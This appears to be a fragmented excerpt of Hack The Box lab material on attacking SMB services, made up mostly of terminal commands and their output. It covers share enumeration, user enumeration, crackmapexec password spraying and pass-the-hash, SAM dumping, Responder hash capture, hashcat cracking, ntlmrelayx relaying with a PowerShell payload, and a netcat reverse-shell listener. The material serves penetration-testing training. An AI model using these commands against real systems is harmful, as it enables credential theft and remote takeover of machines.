...
```
icantthinkofaname23@htb[/htb]`$sudonmap10.129.14.128 -sV -sC -p139,445Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
...
```
icantthinkofaname23@htb[/htb]`$smbclient -N -L //10.129.14.128Sharename       Type      Comment
        -------      --     -------ADMIN$Disk      Remote AdminC$Disk      Default sharenotes           Disk      CheckITIPC$IPC       IPC Service(DEVSM)SMB1 disabled no workgroup available`
```
...
```
icantthinkofaname23@htb[/htb]`$smbmap -H10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------ADMIN$NO ACCESS       Remote AdminC$NO ACCESS       Default shareIPC$READ ONLY       IPC Service(DEVSM)notes                                                   READ, WRITE     CheckIT`
```

Using`smbmap`with the`-r`or`-R`(recursive) option, one can browse the directories:

```
icantthinkofaname23@htb[/htb]`$smbmap -H10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
...
```
icantthinkofaname23@htb[/htb]`$smbmap -H10.129.14.128 --download"notes\note.txt"[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt`
```

```
icantthinkofaname23@htb[/htb]`$smbmap -H10.129.14.128 --upload test.txt"notes\test.txt"[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.`
```
...
```
icantthinkofaname23@htb[/htb]`$rpcclient -U'%'10.10.110.17rpcclient$>enumdomusersuser:[mhope] rid:[0x641]
...
```
icantthinkofaname23@htb[/htb]`$./enum4linux-ng.py10.10.11.45 -A -CENUM4LINUX - next generation
...
```
icantthinkofaname23@htb[/htb]`$cat/tmp/userlist.txtAdministrator
jrodriguez 
admin
<SNIP>
jurena`
...
```
icantthinkofaname23@htb[/htb]`$crackmapexec smb10.10.110.17 -u /tmp/userlist.txt -p'Company01!'--local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
...
```
icantthinkofaname23@htb[/htb]`$impacket-psexec -hImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation
...
```
icantthinkofaname23@htb[/htb]`$impacket-psexec administrator:'Password123!'@10.10.110.17Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
...
```
icantthinkofaname23@htb[/htb]`$crackmapexec smb10.10.110.17 -u Administrator -p'Password123!'-x'whoami'--exec-method smbexecSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
...
```
icantthinkofaname23@htb[/htb]`$crackmapexec smb10.10.110.0/24 -u administrator -p'Password123!'--loggedon-usersSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
...
```
icantthinkofaname23@htb[/htb]`$crackmapexec smb10.10.110.17 -u administrator -p'Password123!'--samSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
...
```
icantthinkofaname23@htb[/htb]`$crackmapexec smb10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FESMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
...
```
icantthinkofaname23@htb[/htb]`$responder -I<interface name>`
```
...
```
icantthinkofaname23@htb[/htb]`$sudoresponder -I ens33__               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
...
```
icantthinkofaname23@htb[/htb]`$hashcat -m5600hash.txt /usr/share/wordlists/rockyou.txthashcat (v6.1.1) starting...
...
Guess.Queue......: 1/1 (100.00%)Speed.#1.........:1122.4kH/s(1.34ms)@ Accel:1024 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: compu ->kodiak1Started: Mon Apr 11 16:49:34 2022
...
```
icantthinkofaname23@htb[/htb]`$cat/etc/responder/Responder.conf|grep'SMB ='SMB = Off`
```

Then we execute`impacket-ntlmrelayx`with the option`--no-http-server`,`-smb2support`, and the target machine with the option`-t`. By default,`impacket-ntlmrelayx`will dump the SAM database, but we can execute commands by adding the option`-c`.

```
icantthinkofaname23@htb[/htb]`$impacket-ntlmrelayx --no-http-server -smb2support -t10.10.110.146Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
...
```
icantthinkofaname23@htb[/htb]`$impacket-ntlmrelayx --no-http-server -smb2support -t192.168.220.146 -c'powershell -e '`
```
...
```
icantthinkofaname23@htb[/htb]`$nc-lvnp9001listening on [any] 9001 ...
